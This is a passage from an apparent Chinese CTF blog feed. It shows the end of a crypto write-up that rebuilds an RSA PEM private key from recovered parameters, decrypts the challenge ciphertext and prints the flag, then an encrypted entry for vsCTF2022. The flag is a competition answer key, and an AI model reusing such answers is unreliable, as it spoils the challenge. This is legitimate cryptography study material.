class="string">&#x27;020100&#x27;</span> + <span class="built_in">hpad</span>(n) + <span class="built_in">hpad</span>(e) + <span class="built_in">hpad</span>(d) + <span class="built_in">hpad</span>(p) + <span class="built_in">hpad</span>(q) + <span class="built_in">hpad</span>(dp) + <span class="built_in">hpad</span>(dq) + <span class="built_in">hpad</span>(qi)</span><br><span class="line">pk = <span class="built_in">hpad</span>(pk, T=<span class="number">1</span>)  # 文件头</span><br><span class="line"><span class="built_in">print</span>(pk)</span><br><span class="line">pk = <span class="built_in">str</span>(base64.<span class="built_in">b64encode</span>(bytes.<span class="built_in">fromhex</span>(pk)))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;privacy.pem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.<span class="built_in">write</span>(<span class="string">&#x27;-----BEGIN RSA PRIVATE KEY-----\n&#x27;</span>)</span><br><span class="line">for i in <span class="built_in">range</span>(<span class="built_in">len</span>(pk) // <span class="number">64</span>):</span><br><span class="line">    f.<span class="built_in">write</span>((pk[i * <span class="number">64</span>: i * <span class="number">64</span> + <span class="number">64</span>] + <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">if <span class="built_in">len</span>(pk) % <span class="number">64</span> != <span class="number">0</span>:</span><br><span class="line">    f.<span class="built_in">write</span>((pk[(<span class="built_in">len</span>(pk) // <span class="number">64</span>) * <span class="number">64</span>:] + <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">f.<span class="built_in">write</span>(<span class="string">&#x27;-----END RSA PRIVATE KEY-----&#x27;</span>)</span><br><span class="line">f.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220718025947985.png" alt="效果图"></p><p>如上图，复原成功，试着拿来解密</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> Crypto.PublicKey import RSA</span><br><span class="line"><span class="built_in">from</span> Crypto.Cipher import PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#测试密钥解密</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;privacy.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    private_key = f.<span class="built_in">read</span>()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypt_text = f.<span class="built_in">read</span>()</span><br><span class="line">private_key = RSA.importKey(private_key)</span><br><span class="line">pk = PKCS1_OAEP.<span class="built_in">new</span>(private_key)</span><br><span class="line">msg = pk.<span class="built_in">decrypt</span>(encrypt_text)</span><br><span class="line">print(msg)  <span class="comment"># b&#x27;flag&#123;f1bf5c44-e2b4-424f-baff-b38b73a82e72&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>成功！</p><p>值得一提，以上私钥文件填充的  前缀+辅助参数+长度+<code>00</code>  的方法叫做<strong>TLV</strong></p><blockquote><p>说明：<br>02 - tag <strong>T</strong><br>01 - length <strong>L</strong><br>03 - 00000003 在公钥组装中，舍弃0x00；私钥组装中，保留0x00 <strong>V</strong></p></blockquote><p><strong>打个小结</strong></p><h4 id="RSA-PEM-私钥文件"><a href="#RSA-PEM-私钥文件" class="headerlink" title="RSA PEM 私钥文件"></a>RSA PEM 私钥文件</h4><ol><li><p>对RSA各参数使用<strong>TLV方法</strong></p><ul><li><p>参数<strong>第一个字节</strong>（这里是<code>9c</code>）<strong>超过<code>0x80</code></strong>就需要高位<strong>补充<code>00</code></strong></p></li><li><p>计算其<strong>「长度」</strong></p><p>若长度大于<code>80</code>则<strong>辅助参数</strong>存在</p><ul><li><p>若长度需要一个字节表示，则辅助参数为<code>81</code></p><p>例如：长度为<code>81</code>,则表示为<code>81 81 具体数据</code></p></li><li><p>若长度需要两个字节表示，则辅助参数为<code>82</code></p><p>例如：长度为<code>0251</code>，则表示为<code>82 02 51 具体数据</code></p></li></ul></li><li><p>加<strong>前缀</strong>（除<code>version</code>前缀是<code>30</code>外，其余数据前缀都是<code>02</code>)</p></li></ul></li><li><p>加<strong>私钥判断数据</strong>，<code>02 01 00</code> +<code>各参数TLV后的数据拼接</code></p></li><li><p>加<strong>文件总长数据</strong>，将第2步的结果用TLV方法（前缀为<code>30</code>）</p></li><li><p>将第3步结果<strong>base64编码</strong>，每64位字符为一行</p></li><li><p>前加<code>-----BEGIN RSA PRIVATE KEY-----</code></p><p>后加<code>-----END RSA PRIVATE KEY-----</code></p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>私钥、公钥文件的人工读取</li></ul><ul><li><p>十六进制泄漏低位不影响计算</p><p>十进制砍掉高位，我接受的来，十六进制当时确实是迷茫</p></li><li><p>CopperSmith思路寻找、转换思路爆破参数k的方式 </p></li><li><p>PEM私钥文件生成原理学习与实现</p></li><li><p><a href="https://blog.csdn.net/Summer_via/article/details/109340744">16进制转byte</a></p><p>直接.encode()不行🤔</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsCTF2022·Crypto WP</title>
      <link href="/2022/07/12/vsCTF2022%C2%B7Crypto%20WP/"/>
      <url>/2022/07/12/vsCTF2022%C2%B7Crypto%20WP/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="341b98a987b628c664226c616fad18fc2c99debb812558cea0a17040e3fe4513">573c1756365396c60292f417431663bda20b4a8eb8e7ec16df38f87fb3346cef0752e62d7df33379ea4bc551e4a29ebeb005af37923108e40b9b10c67450560adaa28ecbb09ec7c0bff2ecdb194806ce6ff1471c960f692e5322d1fc7f8765ccbb061326d0151b3e1d40986b25b083c549ffdb0175564b4c9549f186e6eed21886c5d1e0a32490d11fed5171b309465aeab8b665b7f7e474d7b3738a2cdbde938a5411acba17007d88d0417d6d3b5ca217fe4b7ebae26355546779fe9d143169caae6e154db279681384368467a38aa3911f43f3aeddd45a52a5d8de5fa397e80cb7ab8da140bdb9d6939223ea1e432373de508aac8ee27073329c2ae55c7ee4f6575336de4a5cf0e3c6816b12be507e3839a04b0c2e2d9ee174968da35aa3b39845a7f3e3167bfd48c90c2d405499338ebc8a392b0fe895232e6bbf8fb63c1bb38788864f8b79d863cc8e33053406e15403e52caf77555eaf814452143a9d3e74647e1eedf16cb858b3e59511d853c801ecdf9a80a947a3aeab9ca1f5be69949c5ccfbdeb7a6bb152f52b189d6e299c5ccb8b84542b9c06f73cc89f372235b4c2dda7dc5a7dd136ef8797c394e1eedf402e4d1b86b4179bad4a0834ac16224b92167155eb3545304209a810c118c5f40fb2485be2c894ae497661fe191db0e410af2f8acc5a22325aa72bff77aac2c9bbe3c37183e75112afce886aa8344c265629704a9b2df11690be261638e59e3d5a71e5bf7c602cc48a870de124287a9d70493dd360ba44598683b760b415d2f801b2168ef5d1050633cd0937161bd8688a78046c761eb2a8a209efa4bab445b42293f1dcf0673057e01b3f9f921d727a620f46a50a5982ff619ed3830976d70448aab949c8b674ae926bd5575aa5e870e8c52d1c04d463304b5002c78f36c7e7e848daad9e00542fac8b016aa5795a0150f3147c6202a65be5a06337d0b56fbd39f1ec466e6806efed6fac97a09fcd5d6631970b922e7f8ba18a1c48de24172c456ad550c27ed49d10441f0d673d9f07e618e735017a2b124cb44caaf42f04a56bc06f900fd60c152a590d1ff898b7e251b6b3bb6260ca21e43008c8b4b57ff41a1b2a3bb90c3477657240cf92f6c370ecf626992ac9141342d4dcb977b63acf1955ad917ef040ff650793b0041c2980e91e910fbf6ae39f9331e2da47402caa9c4563c962899870b12c8d9424d4284dd3bd69afbaf06ba2154ea833f9365bb248a7603a3e418a78b4faa1771f74552110081de093db534d5fac8ab02ea247b40c38141066c3d8cca5f36f56c087e60cf035b4eb88869302caea9518cf270dd14f8a6c36962e72fb40b0e0f5dfdc8b6a8e640b72d99b510045da86ef032c1108e0527259c3bc5316b6a68083425425e15036ab1c7ad1ca98de6f4088e567b93fbec1ed4efce0f3c4db74a2ab635ca8bcbf97f25e43a6bac277a8dfa06d5c66c0be9291e16dc48d078f383ce0a57863771200553a512e5ca8d68bdafeb236711ebc0c50e718045d4630a9eb5eb78f528008d5066f5f936f8e7229efa7b28d913019db80a46e4f26850abcdb776a9ddec8f7788be76ffc2dc8bde9015e3cd5b5764dd03aa8d429033ec533f4774a3edaed6b7cd2d515a4cad0c07d203fd15040c3645e96b46372349e1cd3eef9431986cb8da0c7e2726fdce4615bd2e423cd68fa1e4869a8938f87811a7a3cf70fbbf467c32ef78668d68e78c82cb1ed82fa4ee7ad4a641a20e019c92d8c509c0399c9f916e915ba0f9574c9fe65b8a17a1d1fe209a7b755573406c941ac70062878102dcca4d806549dc6618e5201dedd37dabe0859352ac3762089a3d28f3d5abc9d703d0679cbeef6dbbdd8b7acf351c437fc5c12679005fdb872612933bff1549e2cfaab5aee4b808f9d369c495d68dbd91a96f64d914399c1db08d042f5e3e3ca58d3cdd54c64beda0b0ff8cd4b4199afd8038d10032ac97b78a429d3d42f3db08b52945d34a360d283f31124043a03778afb1c592900b6bce752bff226c2f73be07fb403fc466968766914f551c92d12ed31f750f19644b6371593228605260e02df71c8a64e4da4e24f8e703b2b17c9f70cd88a149c71f6c58588866ab9715bc9f7d07ed7c756df76ffcb7456e50cac1b5fb6cc64adfdaaddb3b64e7a3769333c6289c80f3d50445b2daa5ef47fe407ad4f270ccb9357bf5555b449a27ecb2e039466d16c5c7b3fb089747b6f1d116c4906e688a8a3fa7959fee4cb66e7d784287156983e6662aafc2a5211e939382e941382f67927b61427664a8fa1945162151a0419b74b08f504055ca71026ba3478241034f62345868514553aa8d3fd0b4ce8e84016632f2a1535f6180f161f9b86ee162b43d8fd0cae77e7e08981b7a907ed95764d95cee61c44461f812c195de1d8c198b7a5a78da06917f3381321fb3b1d4a1ae4e1b9df1df4805f1ae489acdf32b6571ade4cdaba76c772e59f5d22e1c0a2001a3fcfc377f44ae6114f27917c4a5332eacb07102da7baaedac854662670c788c0cb4da27eadbce2c54a2d2d8fcf9e7be0a75cd578cc327427f98be2f4b68e0b55ef6c07a602b0fac2745d21ce4b43fb77e495e111dd757cad268904e0d205df61128afd139ad63908bf95f28e018046a3c0b58ca4556c6b00ce5e6556a8f710a90b048d7eda82e0b06f37494982ec4685aa2cd47557fb52abeed8e4ff17c1c8cba44738dd82bfb257545d4b30c11499d3ee985e9c83a6b96d47d7eeb960147a9649558dad6dfaa2d3d20fba71c5deae1c54a8c6e73828cc97caf995934976922655e4f5e99a3b67347be9608599b8ed6a7b6a0284a5a829e1773194f0030d321a9611b6382962cdcb4e2423ff0744d5cfb59703c8c7d01b2c04d2158c151b7a0d26e5dbb487e71fefea000eb7d991b76d4c5b19aa0a8b99e02ca5845f86671ddbe990cac900da558199e626f41b8687e02c41f6cd4116b3d3778f825a6a24efb871d9556dec83421fa77c43746b3791d0496d1085fa2fddb6889917d48d9b34b59ed68bae292ef867c8b14bce541cc95b4308735882110fa07df90c11d3d31e7c76b872ba89121f8ec4eb27a9a64353b1c3f4b25ec9d004a3a7ecfd1f4f8dbb32de82f54292af4710883c9d006765467c98c6b1d236776db0153eb05794bbebba59e533eb43013fc5b0f197d45cc0a5c934165f313481e880641e9869d922f1801852550add4db80a4ad6aa471c8a420a65a04e1243171616dc36917afe4ab492b2cd6d8fac590a455a86b9f6e357d401451787fcf4f6261fd02e1ff93d88b486d1f076b2b1af6fb81dc1ebeeea2b77c46097eb14481ff56cafad51cc741e6787f8351b07924414b4e83533672d0643be094607240f8eafed246216b8a3f63eeee0c9ff8e8c02def6386df0eb16a4eeb4a339fb2ec1b537344eb1919944a57d91e761f36651475e68c04819006460a3ba3ce920a4ebb5db36bc5aa5ac0d4252313536de258260994892450884587c0a2203ecc2e022e25fa50388083c17a1aa76fa00e5c94f7c86e0cc2c11f1d264e9dcff7af98afde009bed8a721df91ee0f7ada03fbda50dac206553e1773dc3a3df424c6fca11595c6616bf513e5f64724c25219818b447e5c059e09024e0181c6645f2381f7caa2c7c2d4790879368f19e643fcf9fcd95a7cd9afe8e86d63a5a857e1fcd21b7c111ccd1c1a27964435047d1b76057bfc4e38ba53bc47460aaea108eed30233708705c3ab8a249dc648a678c451034a97547effebed88f5b23c8bfa6255eed15e048a06b7fcdbcaf93ed4b73cd5c4b7c742f220ed7bce45b3cffc48b3718f43ab788c04064064529c558d43ef58502bb0e9c7383452b0901fbc38b8b27a4a3705b357a4d3cf239b9fe4956f2047a24c4f62527ea174ef5b08a7c3469cd7e013b6ded338d6797dff98e71ab58c883ac23bc400602a17ff0bacacd0d33e9a990eb5808a963592ffff2234f6423500e25927585f7c445a7e9bcee0c5313d9652336a5b6ddb570d4b3f243542df073a996fdd2cea8c7babb8ff9e2869923d8d70f0fd6f1ded38a5ebec631888e0f11ff7cfa72af5e33c167f99a294ffdea58eaddcf74608a5de2d272d603afe663a4567cf7c6b1272f9cfb6f1a432bd882fc4b51024f55503685d3716ebf35be432e4467855815fd2b0b3800cf3000d9b5ee9f1dd56d93806a3ea3045762bb13f38615e6f7cb81e276b7f389733416e48d9eb35ade6c73de8eafbaf7f04fbc176cc5a1724e620b5d252397ab346f4f8f00ef46624b1a07d145bf63b3d17df28e3c6f330b5c122d53c104272bd77b7d6d4a9766194c43fb48ca8f57f7dcdb01cf5062f17ee841119fcb371f24b31d621762d8e7382e8f5e3fc9692d70522d9a60a783f6fa71f9fdf832052390cf522ce61fa25f1d610665d48a6c5e57f6f33ad09bd281c11c0dddbb7f4cb04bcce8d58e9e4d11dc7afa037c7e1fd91ea82586b81eb93e4d5dc20a70b87972f28537af934fbb2f4fde6fa983ccbe864d74eba88225bada980c3078aecca894e85e1530445ef6653278448e38d0693d0d1d6d20e1c7af8591db226c62b32edb48712ee08835e6bfbd16fafb24d950ed35ef82d51a883a4f4520d409851d683b1a9e4346be32c78bb8171eb0b3b78de21e5b62b09940f15412ec106b9ce0a1f5bfc1cb9b4440c60c96fca12eabedb43cbb4aeda721ad9f2997ff664eb84de39548463fc91aea0ae6daa5724716d16d9edacfce5a1d8d2b4fec9027aea678612968dc279f0b6f3d2a5dc8da791b009c4f02ae2df87d6baa221ba26977eb2ba3858c78fa196853d2936eedf4e61909d546c3b3879327bbfc21767063806207cd57456a824384cda42b5bc6c3ff5c1c2c6cae0becf9e8d6828786fc9cf9818cfde18934c6ed7f96e19b5c8017570795a9a6ef471532d753402f1a127d936972dc9c7887b8503c43c98dc6702b28602a50d338ee14252316e32436cef41d6b00600d46b17096f41f821bec44eabbe1c68a8ecad1a310d4f8e4724dbae3ae53452140ab3f05fe086aa65382030b4ed24e56eb1cebbf25a9170a8630c94868edf47beca29c9a6398ae4922faebd51a4a6f12cf36af5e6aba53bed36c54e9ccdd0fc607852034197398ca8abea1de63dcf503bbb4a97dba707826a67e07530f65ce2a75db611cb2dc7d2c8bac715238042044bbdfa7c0b1aa1fecc73cc11d3f314243096120f1a2441f08fbf3a4221e7ba36d90781b0be36338453201e15b419a88533e84c017cfb2070f07dedcb9e554e01e7cc7c2acd87ef9aeadc50e31090a1fff0bdc808ff647d771f4f7acab81d582520f5a002a78307a575d0a01e12697c6c411334e4a44f7fc6e774362fa21ef3907ec5cd2cbd7676f12d009355cb2566518a77b1a981ffdb9250be270a5a62c1f9a4c1ef8a893aee723f0db5bc03f1dbc477ac04ce66f7be63603403060a395fa38773be92b2ffd189ba718d20020230fe8ee09c4b865a88e6c9f527aba84684f20ee4d4180e507dad80c972eb1781adc3d8c8ae3eea4d3bdb729d0b45c0c99c731bb831a825ea667ef03191de65b4bcfa6457d57914494f13a2c39ee27fbcf16f9dc8ccb70e84293edff8f2ef1374f095832babe4bf1ab27d527a057b585af851c2e4166ebeac24071f36d87bc586dfd7218cc2684b72b7f1693b85dca26462de6dd510b6adc81ed490741fc839f5e702dd711d19fba0fb10625edf5991977bdd7a1928432bb802c84240c2aedff3122f0bf005dde159ed8f4173e93971ee4640baa95df6aad2e91f8fe7e524a34b96fad23ebccd0a4fe41f01d649d7cf488ab1fe1e6b2b3389c332e856d5f36697ebac18994aad7fd395271aa81ef4350b40f779f047982096fe74ba4b674c1f58f813352a4d390b4e56407653a47ecf93786baa80fbc1fdc6c70d1bfdd7be20b37394ed4631f3f8ef8ce5299c31fbad9f98bde5c60d2b3ede0159c5f17bd73764d243b8b0d09a97e59b59f0cbe55f0fb3eeafcdc6dfcac6fd8f5faff70f8fc049ef7b6e2c4596267c2fd4d95a10ddcecf6f70f59f95fd31cefa2b8130f58f3712fa6a7f673b277153031f239e8a68224d107f1e24788273cf8b339b8f85ada2ac322fa2b42ace6e72304eac032e5e822718cec9a73c162bae0de5d357bd0b5a1f2bbbd73cc83a81e08034a9209a676861b1cf22bdf146aa1cc13d956f96c8c75918f859383952affee2b010ae1b0188967ced4ed2cb0eae5d514e376e63070b32385da78f0f924e8849c82db32a6abbee6a33b728c32dfe35ad883bb9e71793461b87cf9910a1dcf5eb7854aaf18e5f90d7aa5589bb9438727bee17e5eed4aba76e02a87ef491b62d1a7bee15a7225ca51b28046da94a59dc9582e3e569f67ce52f492b8f52bebf86ee244e07f45ffcee9ee1cd90b71a48f614291337c249e32fcae7127f3d94a80a429d1093032720f8e0b5658b27bf567adfd08860020163dfbb45703ed78cb57c4ce5fdad545d565a7cfba2e8aa521cade39c8eee4bb940492c107bb228475b1bf34d8e481fae289e6733a1726835a85e229fe84908d6ffa7444c28f5688f5348287d8d29f49426746bbbef876b8c66b3943daad7dfedf53a599eca3fe6b9aec36ad9238d83e3fb513e054415a1dde0d2f0072316fa6594e8f248b14dcc8274c07f9313e7a39b3346f98e572d57b14e109d92b3989436a9082002f2581307bf9f40b6dbdbfdc14551647893fc047438aadde337a4ea927c0e7789ff53aa06e92e515272463ddfab2949b5e26842cd27339653b5634c5ccd2eb0432a506a121309cabf88d76bb8608b6076a2a3c8f97e0553773c1bd57378bb7d7701841dba344068e570a9c4d439e8cb94c191168dfb59d32fd2e372f2e8b55c4b5872942370bea32d83bcde671b63de76846e509a6840a1b78c53d82e993b396ab035d1abf91f898f2f2fef2969402057261ff0313206e0796d7320851edd16346db9828ffe122ec5a2837ad19ab205e37090beac643c896509208e81cc1959d126d061bf995c3c43adabe2cd0148a1fb5ede2547e85a3d2e4bbd2c71fcce139e15bd9531a524f10bfbd51fc8ada1f4f3251957093f3b5ee3314473c6433c8b3866e7313f61a7d50508a0fc0db0fb3fb5b68cb5562776927a5790b64fa6d2a8d22c7865455ff8e3f34958e1de9d21c5d095518df952a3868529a54ea2f989e3ea967bcaecc2853da777d3ae32981860757edbf2dfcb3f2a3e4e20bda393d3c2b07f3c224f95c5c3e1fad1300d681116241f52f42c0fc5cc80cca0ccd1cf336f3a64f18feb82cba913bec76b2612cf7c24d4825b7429ddc800c0912c41f372797d6c848df37b7eb35177f8d0c2f15337cb822fbd2807be4769c3d3dbbff0171c1a3f6771ec461ea5dd67815e5ab2cf716e94f4de354f6ec73c745f6e84c124887e0ee2ce7a2dd9f9affbfad9c67e0776e0f765421606903673ae69be6491e1b14bf15d3ad80f61d96979c8fbab4900f9b5aa2a235385a49def07ce1d711a246c204dc03877e437c0ccfec04c412f1dd2da5677c7f91c6c684a30278389b2848492832257357a8b78a461b48b0e11aaf157eeb376b3f4d01cb7c50a15ec3dac55b1ab2c64d163f2f5762b124406a4dd2a4a0914388e2882f1557f09f7ce0dca0545d9cedc5c3aa8bc22788ef25aa19ce639de9753129810839a9cc525a033ffc63bf8c8458c76ad4eada0cdf63ec46f6e58d6b05fcf00b3f16ed47f220f920e536c5e9cc33467754f954c64e07fecd339e01ae785e53f547d3e34113cdf22133e1c50281829fae699eae53d93b7cadc3ebd64972d154529d2c65e6281de579d500a6eed0bb5b8d4fe7c58d76d432cf4a1bf82c473df7ccc27ea329eb2f27585b3b1cc4fb1c0c6a41e972372ef47ad954e66a3cc38d45017528d367365a64338478bd411a2d48f7141cccd3317c27dace1346a8fe35ced8653cd3e18bd7ee2590a6efe2a37c03ea0f6bd28bb5ced0bfa48c2edd8fcb412bc56217a5f9de52346901b8e9d0e203658a1c66e8cfaff3a4f0538782644670794e260a9e93e40fc50823f007fdee9026e1e16c2ee91dde94e4a9ea87745e9fd2b0a81543742471ab0b8177850cc46af5ee03dc3a92bac32eae55cf14cf4c61af47c5cb7cab6772e5a16243cdbc07a27e029142b01ec35c05aaeed68711af66f5053f069d37661771fddbbe83fef9a09b431deee371111acb94c53f39e722e69f54973715a3e9eb84276e10cc8fd56877f570ad8cbce29f1b7efcf66c9e0ff9e77786127b9fb7d108f227f20fe78a5d7b14180bb390e8ac306a879041ae32bf2c8dad7e94fe0fb7dbbe5d162e413d30157b4d9dcae959477d3201669a3c9321549ff6290c67aac0fbebac1ed9722948afb76fcbb208b4c5ce5e8f9efdb2642b888949e7d7b339c5bb7b3d936fb18a4634aeb87512cd3f4cf7abaa0613e8ed04a2d14b3890fa9985f660ae9cc9945d8afc7d6e77c6d9266d06dcaeb46bf52c07440febbd862271b8cdc3ad53c93a215c6201832c0fc266848d1d57643e8c53c167bdd204e1f34148166031efb9119096c9837e618e83e6eef3b3e51c876a9c3756942ba75988a1790338e6658807baa5751c1faf9b8cde873a68f8110eafea96261ac7ee5b443851659eb003c5a903e3a5c221ae589182880c2737f4200cef8125c611dfab765a467a610d67154d1ab9b69610c0fc8c8b4d5d028143a61406ebcf491df7e84e0d117214a21591c83273c8b77e50abac1de8c9f5a9f17952678c993d5b9991fb8484ae9bf806e6da60332a1cc55f815e6ad777086148fe660ae4c17cd65827b43c68b8468552b4cef32a3701af33903d4fe5096eb3e5a6ed443d6d60685915fc80d383aeb333ac66fb7435d5be05fb2f39d3e440d1601365865d22b4fc0ceb4e608c113c38a11c06306b014ebacf60a5b697c2d9256a0466dec6a77e7afcd597e7e5c84cc90fc06a17d65674fcaed4a79688dfdb7757fe7191cbf768d56accc1e7c18b6ee55cd70408fdf507ec16d8df1a976d9a25a7e6f4440f4379f11b635b2201f7c5a20df60540ff666debfc5343ad81eb0489153453276e95c04cc1f1d50ab82ce29bac5cce60a96092352b8cf2339646212f087fbef96d0494e9af6fcbaad7fdd9eacfe63e02f8a5672e1f720382d310c2ae9dce0670134cc6c27af51d452d9630ed8d95f06dfb1a02f7d7a705685dadb2a2b34bd096c877d28a64a6619d5a0cfc7b117d20049c721c67645390f37cc207c965550d09f193c3b004e24fec12cf0e0dad7298e39fa8b154cab2f152b3bec727286c274074eb874d7f4c76db2acecc0763358cc2aff4073d792b9e59be97a2ceb187e140192508ba251d9767c86a4f25cf52bb535a0cc3dcbcf657aea35cc79cdc30f116ac538765d13b8398d1f3faac201f8ced11a6e2f64be9086bfd403ec7b58ab3069ecab73fb29c61a0b79217021e9af88b6cb998a155a5e825014a90674237b2112e3957a07866f86b80f82113788073277da0222f837f3f883034982f422580cff933268f2fde87c65c53f1f1a702898857e528269a5881c404622151a35c3bec3879359a1867b9427b834ca5a2e1a15e1919ff3392aace09fa0b473c761328872d655bc500513e3f2787a4c55dc046c5fafbe099ea7e62168543c2b018d7ee63d7b7fcb6a4417626b3dfed383bfe87f21e5017eb2e851ec433b2a1bf376140feb6ee3e1a47272813d34a23f08ac4e0531ce6640b2e4f1627e28b1ae413d1b577549fed85fd2358842ee17fba3e7b6467f54f6db1177e016bdb0e9b66cef8e9841604fc1045de150041f2be915b6186c196e41626be3f41df91bd7af8d73d4dd38cf0e7aceb1f157494857a55cc65bef1f8a6b5cf50e10fa2460897f92a8a844b3288da20d522e173f2eefab45295ee6b81aec281638472357825f6939fa6d45aec1da2f040f91608fd11bf496835ee0eb9382b301ebd22eff0284fdbc85d1ada4115faf5188bbe04a4f3edb8d877b58946401cfac1fc26ab15a454a244b94cbd471cc19b3fc4a4f6471afb60a89ffe9a3a9f472c7baf3a6c9164049fef3f7bb96331578ad3c1aa9e349438c9adfd005d93540eedc57bc604f51b3d1df2bf1b6efef0d1d1ece8bdfa8e0a10374cadc370a2cd41f100becc6b3a675f46118da8a0a561937797ecf7c14eb202522383387d9d451d80cf5d7d58ea2d7f311ed10984002d6cfe21dcd2c4a12871cd67e67aa001ccea1f5a9be389a7a92bbe5ec99dfe29aa9b895148b05c183e1d60a1df77c523f5eba7cfb9d7cf440b0690909f838017bf04b47ebe6d3e25d8d7a037e400ad842212b1d73b6f00318bcc5d3a5c5cfc9ab29d5991b1b38873b441d6fb0fb7f8cacc5a975c328d984a9b3c4510e885133422cfed184d92a26777b10a7deec8e3b02d0c6831db94e63437419adf7513d80491aa3cfcea19d87d4cc1bcb86c14a8fd49972d88f4dc5c8c3a9c2d1d054319372e066c52059818bcf8593acbb47964fc68a7f82d155f549659fd4138340d025bf01fdf7c2482b2ad769a4198b1f603b2af7b48997b9c634f08eed47f2e9316912b52fa5c43d3d8c4526e6736892a3402c08d6e5c411128d8a5e49fb460e7fb98ac1afa70c1c8eade74ac568d0ab1d6781f6af3ecdd3e491179840cb9883a7d13a22e37e9cf28f031c5dd2aa277a8104591fed8eb4918cdafafb91eb545a21b01b3a357614ef8f7bbf90c04066dd6830d70e47102da35ff7bcc0392d50791f7c1428b80677194487996dcfc751f7f14bb3750c952e60d1f48cd550663504e539b239dfc8017435f802574fcad64682a30c828f9ff3380212ce80c6dc56675c6a779dd656af5c029aec5157fa09112754c967b933909d38d0dc3a86a90f61993ac92da50a2577d2821391325d6c3d40f24aa276d64f86851a146694fe41a4dd81b1dc5f964220f1609ee00c76f203787bc62d89f1134ab41bb9a507abbca2b13e42b0111c3a3c7991f4e5eee695509e1a73a0175f466c06f183852c2dc3b51ee473c24610a619cbd0b8514efa1a8fabcc3e97470a726557215b774355e17ec8801e2b374b6ac1a15e9a8fd02f1efb6455b7d150441db90e18d4b11e097cf7269dcf0237729967ce4670802c9fd2dd7485f0d661c7626ce67fbe2673f66de02ad0e9429c703b8a83503f9193ba9859a3522baf25eaa62f466740683ad49c6bb830b2c8af3afa0a6508fbdaad22b725f44a3c5793a5d054df198d1d4ddc0734458a5a4068c03865a8bc90aa2109da153ce3218efc497a8219cd2fba94bfc4258a84f45f6efe3bec6154bad6e042bc3af191ae39e6a4cf29f8e2f6b7f16fa33717ff3c75005bc4c38f7c93efe8f14303d08bd90f3869e1e26179a1a0d6b286898724adde284e5a801a42b98a2b7c88311c0da3f8c8ffdc2a629af53ace41a5bbaf2fe0b55048805d0b507caa02f68e2c392002da3201027f14ba6b0d0d2cc7dfda91424a77e4f270a87a66fda604cc9bf20bafc0970b7731a027b7f6871a218629ac0ed38fb2eb23c6bd3f081a216345f359b2d6925d21d75e3ac89efbf7692e6f8ba6dfe815f838a0dc5b332fb43021432fed2feb38c6da1cc6549dbad504ed347c1b80ed954b37ae217d625e7e04e7841c4b375366ca73ed44df693674e2d58b02b872828354723eaf92ac19f43b37d9263f9ebf128ea94bfdbe5308ee70ddbe8e6e08262b695c024f563c0a43ee6d7af65b4718001c08bcc28bf1b2ac8ad40872e16525b2594e43854b6b4aca6681e12e0d1a90bc2b69029b487ad2335bba31c57aebe2e3f149101a6c00d0f48b81a8ababc86f52c7531fc29be289e2548df8cee267233272251c083d1dd0d2cf77101fcb761a0433a16d284e23a93ef09b50d7defaa3666d74ef87fa9c4a0c697d08cd55f430b3a4d498131f4c31f08e4d1a95ca88baa5bc82a32c1f8827434fa0464295ba5838c16ae56984db518ecefed69af1e7fb55b13ee106c92cc9f8c17c0d9ba8ef7d1150dd5d17bd70a565f8bc10aef2767330da1c8700c919a6dd0ffafcb82a8df3a998d3030b0ef03b4badd2e31346034197dbf7f0ee67d02ccd39d428b9d7ec9fab9b3ea1b2003cb064c7bc9f6454fd7173ee90bf616d8301c7cf7a768d1332834656984beaa89a306f6bd88ceb60d22c5ec89dec9c67d11dfa70644fc9732ad22ec63eaded2a40cfcb134d75d888288888dc1c401eb172022131f081926b97679f225761acf28e2fdc0506cbfcaed4507615e927319324a2ddfe476f89e338824a9f2b53c0ce7c24d4b254503ab56a267e6f942f40898be3fdf62b022ef1e0bdc5e673d8e730344e0675bd228dd53b44795085ad19176fa11d41884fe2e7973bc584acb447190a6953d9c42dea547e9c3512e971883c4380b4090fc04c09811a439a463309e9824810922e328d84a90de114da2879b116bbb0dd052f88d7e397cd97864c9e757461f167c394d150ddea3ed490bb21b0b07829d28dd4d8283716c341381a2c53ad314397778578312c2a11512623e68fbf9797042c17e531f40c84fe67ddfaeba292af696fd92c08557179089b782a5c0ab31dc6659343b1487d347a13ba8017ce244ad0a8abbab2d36a8b0571f24af046dac7c60adeb3721180e94d8e9a9706cc9807f0d7e81147d9e5d94d046d66e26b3a214abc63eae1a7626cdcdfbb786b926f1fd0f24c87983361b30292ab0efa970f39866765039db29f6b4b789b56f9f540727b440bba16ea479e567d27f5560ba7afbe696c28b0b4444b0109625fc3ba6c5d9c9310f80bcc1a66a8eb07805f504a4c9afed91d749b1c6d2b64aacc531a5e91035679f4428f979f019edbcb2effe7aa4190a5790b5034fb29f5b55af17cb302